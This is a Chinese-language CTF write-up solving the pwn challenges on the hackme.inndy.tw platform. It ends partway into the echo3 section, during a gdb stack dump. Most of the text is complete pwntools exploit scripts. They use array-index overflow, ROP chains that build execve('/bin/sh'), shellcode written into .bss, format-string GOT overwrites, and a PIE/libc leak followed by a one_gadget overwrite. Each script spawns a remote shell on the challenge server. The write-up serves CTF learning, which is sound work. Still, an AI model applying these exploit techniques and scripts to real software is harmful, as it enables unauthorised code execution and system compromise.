发现一个的台湾的ctf平台，感觉学到了挺多东西：[hackme.inndy](https://hackme.inndy.tw/scoreboard/)，各种题型都有，题目总体难度不会很大比较新颖骚操作多，还是很适合通过做这些题目提升姿势水平
前面的几道简单漏洞的题目基本上直接放exp，重头戏后面的题目  
由于题目太多了，就分两篇来写
# catflag
nc 连接上去，一个cat flag命令就出来了
# homework
这是一道数组下标溢出的题目，仅仅通过计算就可以知道ret的位置在arr[14]的地方  
直接简单地绕开了cannry保护
    #!python
    #coding:utf-8
    from pwn import *
    #p=process('./homework')
    p=remote('hackme.inndy.tw', 7701)
    binsh = 0x080485fb
    print str(binsh)
    p.recvuntil("What's your name? ")
    p.sendline("your_dad")
    p.recvuntil("4 > dump all numbers\n")
    p.recvuntil(" > ")
    p.sendline("1")
    p.recvuntil("Index to edit: ")
    p.sendline("14")
    p.recvuntil("How many? ")
    p.sendline(str(binsh))
    p.sendline("0")
    p.interactive()
# ROP
这道题是简单的栈溢出+rop，可以有多种解法，我这里就使用system call的方法
我们可以查到execve的系统调用号为0x0b，而在系统调用时，eax是存放系统调用号，ebx,ecx,edx分别存放前3个参数，esi存放第4个参数，edi存放第5个参数，而Linux系统调用最多支持5个单独参数。如果实际参数超过5个，那么使用一个参数数组，并且将该数组的地址存放在ebx中。
    0x080b8016 : pop eax ; ret
    0x0806ed00 : pop edx ; pop ecx ; pop ebx ; ret
    0x0806c943 : int 0x80
    0x080de769 : pop ecx ; ret
    0x0804b5ba : pop dword ptr [ecx] ; ret
exp:
    #!python
    #coding:utf-8
    from pwn import *
    #p=process('./rop')
    elf = ELF("./rop")
    p=remote('hackme.inndy.tw', 7704)
    bss = elf.bss()#0x80eaf80
    pop_eax_ret = 0x080b8016
    pop_edx_ecx_ebx_ret = 0x0806ed00
    int_0x80 = 0x0806c943
    pop_ecx = 0x080de769
    pop_write2ecx = 0x0804b5ba
    payload = 'a' * (0x0c+0x04)
    payload += p32(pop_ecx) + p32(bss)
    payload += p32(pop_write2ecx) + '/bin'
    payload += p32(pop_ecx) + p32(bss+4)
    payload += p32(pop_write2ecx) + '/sh\x00'
    payload += p32(pop_eax_ret) + p32(0x0b)
    payload += p32(pop_edx_ecx_ebx_ret) + p32(0x00) + p32(0x00) + p32(bss)
    payload +=p32(int_0x80)
    p.sendline(payload)
    p.interactive()
# ROP2
    #!python
    #coding:utf-8
    from pwn import *
    #p=process('./rop2')
    elf = ELF("./rop2")
    context.log_level="debug" 
    p=remote('hackme.inndy.tw', 7703)
    syscall = elf.symbols['syscall']  
    overflow = elf.symbols['overflow']   
    bss = elf.bss()
    print hex(syscall)
    print hex(overflow)
    print hex(bss)
    p.recv()
    payload = 'a'*(0x0c+0x04)
    payload += p32(syscall)+p32(overflow)+p32(3)+p32(0)+p32(bss)+p32(8)
    p.sendline(payload)
    p.send("/bin/sh\x00")#这个地方很坑，一定要用send才行，用sendline就不行
    payload1 = 'a'*(0x0c+0x04)
    payload1 +=p32(syscall)+p32(0xdeadbeef)+p32(0xb)+p32(bss)+p32(0)+p32(0)
    p.sendline(payload1)
    p.interactive()
# toooomuch
    #!python
    #coding:utf-8
    from pwn import *
    #p=process('./rop')
    elf = ELF("./toooomuch")
    p=remote('hackme.inndy.tw', 7702)
    flag = 0x0804863b
    payload = 'a'*(0x18+0x04)
    payload += p32(flag)
    p.recvuntil("Give me your passcode: ")
    p.sendline(payload)
    p.recv()
    p.interactive()
# toooomuch-2
先通过溢出调用一次gets函数将shellcode写入bss段中，接着程序流程再指向bss执行shellcode。从而getshell
    #!python
    #coding:utf-8
    from pwn import *
    #p=process('./rop')
    elf = ELF("./toooomuch2")
    p=remote('hackme.inndy.tw', 7702)
    gets = elf.symbols['gets']
    bss = elf.bss()
    payload = 'a'*28
    payload += p32(gets)+p32(bss)+p32(bss)
    p.recvuntil("Give me your passcode: ")
    p.sendline(payload)
    p.sendline(asm(shellcraft.sh()))
    p.interactive()
# smashthestack
这题利用的ssp报错的方法泄漏出flag，在ctf-wiki中有介绍：[传送门](https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/fancy-rop/#stack-smash)
    #! /usr/bin/env python
    # -*- coding: utf-8 -*-    from pwn import *
    #p=process('./smash')
    p=remote('hackme.inndy.tw', 7717)
    argv_addr=0xffffcfa4
    buf_addr=0xffffcee8
    flag_addr=0x804a060
    payload = 'a'*(argv_addr-buf_addr) +p32(flag_addr)
    p.recvuntil('the flag')
    p.sendline(payload)
    p.interactive()
# echo
这是一道基础的格式化字符串漏洞的题目，就不多描述了，漏洞点简单易找易利用
    #encoding:utf-8
    from pwn import *
    context(os="linux", arch="i386",log_level = "debug")
    ip ="hackme.inndy.tw"
    if ip:
        p = remote(ip,7711)
    else:
        p = process("./echo")#, aslr=0
    elf = ELF("./echo")
    #libc = ELF("./libc-2.23.so")
    libc = elf.libc
    #-------------------------------------    def sl(s):
        p.sendline(s)
    def sd(s):
        p.send(s)
    def rc(timeout=0):
        if timeout == 0:
            return p.recv()
        else:
            return p.recv(timeout=timeout)
    def ru(s, timeout=0):
        if timeout == 0:
            return p.recvuntil(s)
        else:
            return p.recvuntil(s, timeout=timeout)
    def debug(msg=''):
        gdb.attach(p,'')
        pause()
    def getshell():
        p.interactive()
    #-------------------------------------    
    system_plt = elf.plt["system"]
    printf_got = elf.got["printf"]
    payload = fmtstr_payload(7,{printf_got:system_plt})
    sl(payload)
    sleep(1)
    sl("/bin/sh")
    getshell()
直接改了printf的got表为system函数的plt表，接着输入参数/bin/sh，即可getshell
# echo2
这题是64位下的格式化字符串漏洞，漏洞点跟上一题差不多
但是有很多小的坑点，需要注意一下
  1. 64位的程序函数地址存在'\x00'截断，所以要将函数地址放到最后（不能用fmtstr_payload这个工具，它只适合用于32位）
  2. 控制好函数地址的相对偏移，
  3. PIE：  
是位置无关的可执行程序，用于生成位置无关的可执行程序，所谓位置无关的可执行程序，指的是，可执行程序的代码指令集可以被加载到任意位置，进程通过相对地址获取指令操作和数据，如果不是位置无关的可执行程序，则该可执行程序的代码指令集必须放到特定的位置才可运行进程。  
但是低两位字节是固定的，可以通过这个泄露出程序基地址
通过gdb的调试，可以发现main+74的地址可以泄漏出程序的基地址，因为就算是开了PIE，后三位也是不变的，在IDA中也可以看到的确存在a03这个地址，因此`0x555555554a03-0xa03`就是程序的基地址，之后对地址的一切操作都要先加上这个elf_base才能得出正确的地址
而这个地方的格式化字符串的偏移是41，可通过%p泄漏出来
其次，也可以发现stack中有`__libc_start_main+240`的地址，也同样可以通过这种方式泄漏出libc，但这里有个比较迷的地方是，不能用libc-database来泄漏出libc的版本，搜出来的结果是错误的，只有通过下载hackme上面的libc，然后用onegadget得出地址
这个地方的格式化字符串的偏移是43，可通过%p泄漏出来
在进行任意地址写的操作的时候，要注意每次写双字节，写三次
exp如下：
    #encoding:utf-8
    from pwn import *
    context(os="linux", arch="amd64",log_level = "debug")
    ip ="hackme.inndy.tw"
    if ip:
        p = remote(ip,7712)
    else:
        p = process("./echo2")#, aslr=0
    elf = ELF("./echo2")
    libc = ELF("./libc-2.23.so.x86_64")#hackme网站下载
    #libc = elf.libc
    #-------------------------------------    def sl(s):
        p.sendline(s)
    def sd(s):
        p.send(s)
    def rc(timeout=0):
        if timeout == 0:
            return p.recv()
        else:
            return p.recv(timeout=timeout)
    def ru(s, timeout=0):
        if timeout == 0:
            return p.recvuntil(s)
        else:
            return p.recvuntil(s, timeout=timeout)
    def debug(msg=''):
        gdb.attach(p,'')
        pause()
    def getshell():
        p.interactive()
    #-------------------------------------    sl("%43$p")
    start =int(p.recvline(),16)-240
    libc_base = start -libc.symbols["__libc_start_main"]
    sl("%41$p")
    elf_base =int(p.recvline(),16)-0xa03
    print "elf_base---->"+hex(elf_base)
    one_gadget = 0xf0897+libc_base
    exit_got = elf.got["exit"]+elf_base
    printf_got = elf.got["printf"]+elf_base
    system = libc.symbols["system"]+libc_base
    print "start-->"+hex(start)
    print "printf_got-->"+hex(printf_got)
    print "exit_plt-->"+hex(exit_got)
    print "libc_base-->"+hex(libc_base)
    print "one_gadget-->"+hex(one_gadget)
    hex_one_gadget = hex(one_gadget)
    paylaod1="a"*19+"%"+str(int(hex_one_gadget[-4:],16)-19)+"c"+"%10$hn"+p64(exit_got)
    paylaod2="a"*19+"%"+str(int(hex_one_gadget[-8:-4],16)-19)+"c"+"%10$hn"+p64(exit_got+2)
    paylaod3="a"*19+"%"+str(int(hex_one_gadget[-12:-8],16)-19)+"c"+"%10$hn"+p64(exit_got+4)
    sl(paylaod1)
    sleep(1)
    sl(paylaod2)
    sleep(1)
    sl(paylaod3)
    sleep(1)
    sl("exit")
    getshell()
# echo3
这题又更骚一层楼，
从IDA中可以看到，这题的格式化字符串是在bss段里面的，这样一来就不好操作了，于是我们就需要在栈里面找到指向栈的指针，来进行写入的操作
我们知道%x$n的作用是，向第x个参数的位置写入内容，如果这个位置上的又是一个指针的话，则向这个指针所指的地方写入内容，这种用法参考hitcon-training的lab9那题
然而这题，最坑的地方是在这个alloca函数，`v3 = alloca(16 * (((buf & 0x3039u) + 30) /
0x10));`在调用hardfmt函数之前，这句会造成栈的分布会很随机很蛇皮
来看一下这地方的汇编代码：
这里的sub语句，会造成栈向下长，而且很随机，这样我们就无从所知栈的分布是怎么样的，如果此时在printf函数调用之前，下个断点，在gdb中看栈的分布，是这样的：
    gef➤  stack 100
    0000| 0xffffadbc --> 0x804864b (:  add    esp,0x10)
    0004| 0xffffadc0 --> 0x804a080 ("aaaa\n")
    0008| 0xffffadc4 --> 0x804a080 ("aaaa\n")
    0012| 0xffffadc8 --> 0x1000 
    0016| 0xffffadcc --> 0x0 
    0020| 0xffffadd0 --> 0xf2beb39d 
    0024| 0xffffadd4 --> 0x0 
    0028| 0xffffadd8 --> 0x0 
    0032| 0xffffaddc --> 0x0 
    0036| 0xffffade0 --> 0x0 
    0040| 0xffffade4 --> 0x0 
    0044| 0xffffade8 --> 0x0 
    0048| 0xffffadec --> 0x80485d2 (:   add    ebx,0x1a2e)
    0052| 0xffffadf0 --> 0x0 
    0056| 0xffffadf4 --> 0x0 
    0060| 0xffffadf8 --> 0xffffadd0 --> 0xf2beb39d 
    0064| 0xffffadfc --> 0x39d9b700 
    0068| 0xffffae00 --> 0x0 
    0072| 0xffffae04 --> 0x804a000 --> 0x8049f10 --> 0x1 
    0076| 0xffffae08 --> 0xffffce98 --> 0x0 
    0080| 0xffffae0c --> 0x804877b (: mov    eax,0x0)
    0084| 0xffffae10 --> 0x0 
    0088| 0xffffae14 --> 0x0 
    0092| 0xffffae18 --> 0x0 